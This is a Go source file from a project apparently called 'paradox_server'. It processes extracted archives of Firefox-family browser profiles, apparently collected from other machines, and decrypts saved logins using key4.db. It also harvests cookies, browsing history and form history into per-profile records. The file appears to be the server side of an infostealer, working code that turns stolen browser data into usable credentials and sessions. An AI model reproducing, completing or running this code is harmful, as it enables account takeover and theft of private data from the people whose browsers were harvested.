package extract

import (
	"fmt"
	"log"
	"os"
	"paradox_server/decode"

	"paradox_server/models"
	"paradox_server/static"
	"path/filepath"
)

func ExtractGecko(sysInfo models.SystemInfo, extractDir string, zipPath string) (map[string]models.BrowserData, error) {
	browserResults := make(map[string]models.BrowserData)

	loginsJsonName := "logins.json"
	cookiesDbName := "cookies.sqlite"
	key4DbName := "key4.db"
	placesDbName := "places.sqlite"
	formHistoryDbName := "formhistory.sqlite"

	for _, browser := range static.SupportedBrowsers {
		if browser.Type != "Gecko" {
			continue
		}

		log.Printf("Processing Gecko browser: %s", browser.Name)
		browserDir := filepath.Join(extractDir, "out", "out", browser.PathString)

		if _, err := os.Stat(browserDir); os.IsNotExist(err) {
			log.Printf("Directory not found for %s: %s", browser.Name, browserDir)
			continue
		}

		profiles, err := os.ReadDir(browserDir)
		if err != nil {
			log.Printf("Error reading profile directory %s: %v", browserDir, err)
			continue
		}

		for _, profileEntry := range profiles {
			if !profileEntry.IsDir() {
				continue
			}

			profileName := profileEntry.Name()
			profileDir := filepath.Join(browserDir, profileName)
			log.Printf(" Processing profile: %s", profileName)

			loginsPath := filepath.Join(profileDir, loginsJsonName)
			cookiesPath := filepath.Join(profileDir, cookiesDbName)
			key4Path := filepath.Join(profileDir, key4DbName)
			placesPath := filepath.Join(profileDir, placesDbName)
			formHistoryPath := filepath.Join(profileDir, formHistoryDbName)

			key4Exists := fileExists(key4Path)
			loginsExist := fileExists(loginsPath)
			cookiesExist := fileExists(cookiesPath)
			placesExist := fileExists(placesPath)
			formHistoryExist := fileExists(formHistoryPath)

			if !key4Exists && (loginsExist || cookiesExist) {
				log.Printf("  WARNING: Found logins/cookies but missing %s in %s. Decryption will not be possible.", key4DbName, profileDir)
			}

			var profileLogins []models.LoginData
			var profileCookies []models.Cookie
			var profileHistory []models.HistoryEntry
			var profileWebData []models.WebDataEntry

			if loginsExist && key4Exists {
				loginsPtrs, err := decode.FirefoxLogins(profileDir)
				if err != nil {
					log.Printf("  Error extracting logins from profile %s: %v", profileName, err)
				} else {
					profileLogins = make([]models.LoginData, 0, len(loginsPtrs))
					for _, ptr := range loginsPtrs {
						if ptr != nil {
							profileLogins = append(profileLogins, *ptr)
						}
					}
					log.Printf("  Extracted %d logins", len(profileLogins))
				}
			}
			if cookiesExist {
				profileCookies = decode.FirefoxCookies(cookiesPath)
				log.Printf("  Extracted %d cookies (placeholders, needs decryption)", len(profileCookies))
			}
			if placesExist {
				profileHistory = decode.FirefoxHistory(placesPath)
				log.Printf("  Extracted %d history entries (placeholders)", len(profileHistory))
			}
			if formHistoryExist {
				profileWebData = decode.FirefoxFormHistory(formHistoryPath)
				log.Printf("  Extracted %d form history entries (placeholders)", len(profileWebData))
			}

			if len(profileLogins) > 0 || len(profileCookies) > 0 || len(profileHistory) > 0 || len(profileWebData) > 0 {
				browserKey := fmt.Sprintf("%s - %s", browser.Name, profileName)
				browserResults[browserKey] = models.BrowserData{
					Logins:  profileLogins,
					Cookies: profileCookies,
					History: profileHistory,
					WebData: profileWebData,
				}
			} else {
				log.Printf("  No data extracted for profile %s.", profileName)
			}
		}
	}
	return browserResults, nil
}

func fileExists(filePath string) bool {
	info, err := os.Stat(filePath)
	if os.IsNotExist(err) {
		return false
	}
	return !info.IsDir()
}
